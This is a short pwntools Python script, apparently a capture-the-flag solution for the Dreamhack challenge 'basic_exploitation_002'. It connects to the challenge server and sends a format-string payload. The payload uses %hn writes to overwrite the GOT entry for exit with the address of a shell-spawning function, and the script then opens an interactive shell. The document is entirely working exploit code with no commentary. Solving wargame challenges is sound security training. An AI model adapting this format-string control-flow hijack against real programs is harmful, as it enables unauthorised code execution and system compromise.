from pwn import *

context.update(log_level = 'debug')

p = remote('host1.dreamhack.games', 8519)
#p = process('basic_exploitation_002')
e = ELF('basic_exploitation_002')
addr_got_exit = e.got['exit']
log.info('addr_got_exit: ' + hex(addr_got_exit))
addr_shell = 0x8048611
p.recvrepeat(1)
fb = (addr_shell >> 2*8) - (0xc - 0x4)
lb = (0xffff - fb + addr_shell & 0xffff ) - (0x18 - 0x9)

log.info(hex(fb))
log.info(hex(lb))

tp = '%{}x'.format(fb-8)
rest = 4 - (len(tp) % 4)
payload = p32(addr_got_exit+2) + p32(addr_got_exit) + '%{}x'.format(fb - rest) + 'a'*rest

payload += '%1$hn'

tp = '%{}x'.format(lb)
rest = 4 - (len(tp) % 4)
payload += '%{}x'.format(lb - rest) + 'a'*rest

payload += '%2$hn'


log.info('payload: ' + payload)

#raw_input('debug: ' + str(p.pid))
p.sendline(payload)

p.interactive()
